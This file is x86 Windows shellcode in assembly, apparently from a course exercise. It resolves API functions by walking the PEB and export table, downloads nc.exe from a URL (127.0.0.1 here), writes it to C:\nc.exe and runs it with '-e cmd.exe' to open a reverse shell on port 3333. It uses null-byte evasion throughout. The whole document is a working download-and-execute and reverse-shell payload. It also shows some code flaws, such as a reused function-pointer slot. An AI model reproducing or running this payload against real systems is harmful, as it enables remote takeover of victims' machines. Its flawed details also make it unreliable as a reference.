_start:
find_loadlibrarya:
	call find_kernel32		;eax store address of GetProcAddress
	xor edx, edx			;ebx store address of kernel32.dll
	mov [ebp+0x44], ebx		;kernel32.dll at [ebp+0x44]
	mov [ebp+0x30], eax 		;GetProcAddress() at [ebp+0x30]
	push edx			;terminate by null
	push dword 0x41797261		;argument "LoadLibraryA"
	push dword 0x7262694c
	push dword 0x64616f4c
	push esp			
	push ebx			;argument address of kernel32.dll
	mov edx, [ebp+0x30]
	call edx			;call GetProcAddress(addr, "Load..")
	mov [ebp+0x34], eax		;LoadLibraryA() at [ebp+0x34]

find_createfilea:
	mov eax, 0x41656c01		;arg "CreateFileA"
	sar eax, 0x08
	push eax
	push dword 0x69466574
	push dword 0x61657243
	push esp
	mov eax, [ebp+0x44]
	push eax			;arg pointer to kernel32
	mov edx, [ebp+0x30]
	call edx			;GetProcAddress()
	mov [ebp+0x48], eax		;CreateFile() at [ebp+0x48]

find_writefile:
	xor eax, eax
	push eax
	push 0x65			;arg "WriteFile"
	push 0x6c694665
	push 0x74697257
	push esp
	mov eax, [ebp+0x44]		;arg pointer to kernel32
	push eax			
	call [ebp+0x30]			;GetProcAddress()
	mov [ebp+0x4c], eax		;WriteFile() at [ebp+0x4c]

find_closehandle:
	xor eax, eax			;arg "CloseHandle"
	mov eax, 0x656c6401
	sar eax, 0x08
	push eax
	push 0x6e614865
	push 0x736f6c43
	push esp
	mov eax, [ebp+0x44]		;arg pointer to kernel32
	push eax
	call [ebp+0x30]			;GetProcAddress()
	mov [ebp+0x64], eax		;CloseHandle() at [ebp+0x64]

load_msvcrt:
	xor edx, edx
	mov byte [ebp-0x0b], 0x6d	;"msvcrt.dll"
	mov byte [ebp-0x0a], 0x73
	mov byte [ebp-0x09], 0x76
	mov byte [ebp-0x08], 0x63
	mov byte [ebp-0x07], 0x72
	mov byte [ebp-0x06], 0x74
	mov byte [ebp-0x05], 0x2e
	mov byte [ebp-0x04], 0x64
	mov byte [ebp-0x03], 0x6c
	mov byte [ebp-0x02], 0x6c
	mov byte [ebp-0x01], dl		;terminate by null
	lea eax, [ebp-0x0b]
	push eax			;argument "msvcrt.dll"
	mov edx, dword [ebp+0x34]
	call edx			;call LoadLibraryA("msvcrt.dll")
	mov dword [ebp+0x38], eax	;msvcrt.dll at [ebp+0x38]

find_system:
	mov dword [ebp+0x04], 0x74737973;"system"
	mov word [ebp+0x08], 0x6d65
	xor dx, dx
	mov word [ebp+0x10], dx		;terminate by null
	lea edx, [ebp+0x04]
	push edx			;arg "system"
	push eax			;arg address of msvcrt.dll
	mov edx, [ebp+0x30]
	call edx			;call GetProcAdress(add, "system")
	mov [ebp+0x3c], eax		;system() at [ebp+0x3c]

load_wininet:
	xor edx, edx
	mov dword [ebp+0x04], 0x696e6977;"wininet.dll"
	mov dword [ebp+0x08], 0x2e74656e
	mov eax, 0x6c6c6401
	sar eax, 0x08
	mov dword [ebp+0x0c], eax
	lea eax, [ebp+0x04]
	push eax			;arg "wininet.dll"
	mov edx, dword [ebp+0x34]
	call edx			;call LoadLibraryA("wininet.dll")
	mov dword [ebp+0x40], eax	;wininet.dll at [ebp+0x40]

find_internetopena:
	xor edx, edx
	push edx			;arg "InternetOpenA"
	push 0x41
	push 0x6e65704f
	push 0x74656e72
	push 0x65746e49
	push esp
	mov eax, [ebp+0x40]
	push eax			;arg pointer to wininet.dll
	call [ebp+0x30]			;GetProcAddress()
	mov dword [ebp+0x4c], eax	;InternetOpenA() at [ebp+0x4c]

find_internetopenurla:
	xor edx, edx
	push edx			;arg "InternetOpenUrlA"
	push 0x416c7255
	push 0x6e65704f
	push 0x74656e72
	push 0x65746e49
	push esp
	mov eax, [ebp+0x40]
	push eax			;arg pointer to wininet.dll
	call [ebp+0x30]			;GetProcAddress()
	mov dword [ebp+0x50], eax	;InternetOpenUrlA() at [ebp+0x50]

find_internetreadfile:
	xor edx, edx
	push edx			;arg "InternetReadFile"
	push 0x656c6946
	push 0x64616552
	push 0x74656e72
	push 0x65746e49
	push esp
	mov eax, [ebp+0x40]
	push eax			;arg pointer to wininet.dll
	call [ebp+0x30]			;GetProcAddress()
	mov dword [ebp+0x54], eax	;InternetOpenReadFile() at [ebp+0x54]

call_internetopena:
	xor eax, eax
	push eax		;arg dwFlag
	push eax		;arg lpszProxyBypass
	push eax		;arg lpszProxyName
	push eax		;arg dwAccessType
	push eax		;arg lpszAgent
	call [ebp+0x4c]		;InternetOpenA()
	mov [ebp+0x58], eax	;HINTERNET for IOUA

call_internetopenurla:
	xor eax, eax
	push eax		;arg dwContext
	push eax		;arg dwFlags
	push eax		;arg dwHeadersLength
	push eax		;arg lpszHeaders
	mov dword [ebp+0x04], 0x70747468;http://127.0.0.1/nc.exe
	mov dword [ebp+0x08], 0x312f2f3a
	mov dword [ebp+0x0c], 0x302e3732
	mov dword [ebp+0x10], 0x312e302e
	mov dword [ebp+0x14], 0x2e636e2f
	mov eax, 0x65786501
	sar eax, 0x08
	mov dword [ebp+0x18], eax
	lea eax, [ebp+0x04]
	push eax			;arg lpszUrl
	mov eax, [ebp+0x58]
	push eax			;arg from IOA
	call [ebp+0x50]			;InternetOpenUrlA()
	mov [ebp+0x5c], eax		;HINTERNET for IRF

call_createfilea:
	xor eax, eax
	push eax			;arg hTemplateFile
	mov al, 0x80
	push eax			;arg FILE_ATTRIBUTE_NORMAL
	mov al, 0x02
	push eax			;arg CREATE_ALWAYS
	xor al, al
	push eax			;arg lpSecurityAttributes
	push eax			;arg dwShareMode
	mov al, 0x40
	sal eax, 0x18
	push eax			;GENERIC_WRITE
	mov dword [ebp+0x04], 0x6e5c3a43;"C:\nc.exe"
	mov dword [ebp+0x08], 0x78652e63
	mov ax, 0x6501
	sar ax, 0x08
	mov word [ebp+0x0c], ax
	lea eax, [ebp+0x04]
	push eax			;arg lpFileName
	call [ebp+0x48]			;CreateFileA()
	mov [ebp+0x60], eax		;HANDLE for WriteFile()

download_and_write_file:
	xor eax, eax
	mov ax, 0x1008
	sub esp, eax			;expand stack for buffer
	mov esi, esp
download_file:
	lea edx, [esi+0x04]
	push edx			;arg pointer to save read amout
	mov eax, 0x1000
	push eax			;arg amount to read
	lea eax, [esi+0x08]
	push eax			;arg buffer
	mov eax, [ebp+0x5c]
	push eax			;arg HINTERNET from IOUA
	call [ebp+0x54]			;InternetReadFile
	mov eax, [esi+0x04]		;read amout
	test eax, eax			;check if over
	jz download_finish
write_file:
	xor eax, eax
	push eax			;lpOverlapped
	lea eax, [esi+0x04]
	push eax			;arg amount be written
	mov eax, [esi+0x04]
	push eax			;arg amount to write
	lea eax, [esi+0x08]
	push eax			;arg buffer
	mov eax, [ebp+0x60]
	push eax			;arg handle of file
	call [ebp+0x4c]			;WriteFile()
	mov edx, 0x7c92fe21		;call GetLastError()
	call edx
	jmp download_file
download_finish:
	mov eax, [ebp+0x60]		;arg handle of file
	push eax
	mov edx, [ebp+0x64]		;CloseHandle()
	call edx
	xor eax, eax
	mov ax, 0x1008
	add esp, eax			;restore esp

call_system:
	xor eax, eax
	mov dword [ebp+0x04], 0x6e5c3A43	;command line
	mov dword [ebp+0x08], 0x78652e63
	mov dword [ebp+0x0c], 0x652d2065
	mov dword [ebp+0x10], 0x646d6320
	mov dword [ebp+0x14], 0x6578652e
	mov dword [ebp+0x18], 0x37323120
	mov dword [ebp+0x1c], 0x302e302e
	mov dword [ebp+0x20], 0x3320312e
	mov eax, 0x33333301
	sar eax, 0x08				;use sar to avoid 0x00
	mov dword [ebp+0x24], eax
	lea eax, [ebp+0x04]			;get address of command
	push eax				;push command line
	mov edx, [ebp+0x3c]
	call edx				;call system("C:\...")
	ret

find_kernel32:			
	xor eax, eax		;refer to slides and win32-shellcode
	mov eax, [fs:eax+0x30]	;PEB
	mov eax, [eax+0x0c]	;PEB_LDR_DATA
	mov ebx, [eax+0x1c]	;first module
	mov eax, [ebx]		;load
	mov eax, [eax+0x8]	;second is kernel32.dll
find_getprocaddress:
	mov ebx, [eax+0x3c]	;PE header
	mov ebx, [eax+ebx+0x78]	;export directory table
	add ebx, eax		;absolute address of export directory table
	xor ecx, ecx		;number of function
	mov edx, [ebx+0x20]	;relative address of name list
	add edx, eax		;absolute address
	push esi
	push ebp
	mov ebp, eax
find_name:
	mov esi, [edx+ecx*4]	;name[ecx]
	add esi, ebp		;address of name[ecx]
	mov eax, 0x50746547
	cmp [esi], eax		;cmp "GetP"
	je find_name1
	inc ecx			;next name
	jmp find_name
find_name1:
	mov eax, 0x41636f72
	cmp [esi+4], eax	;cmp "rocA"
	je find_ordinal
	inc ecx			;next name
	jmp find_name
find_ordinal:
	mov edx, [ebx+0x24]	;relative address of ordinal list
	add edx, ebp		;absolute address
	mov cx, [edx+ecx*2]	;get ordinal
find_address:
	mov edx, [ebx+0x1c]	;relative address of ordinal list
	add edx, ebp		;absolute address
	mov eax, [edx+ecx*4]	;relative address of GetProcAddress
	add eax, ebp		;address of GetProcAddress
find_gpa_over:
	mov ebx, ebp		;save base address of kernel32 in ebx
	pop ebp
	pop esi
	ret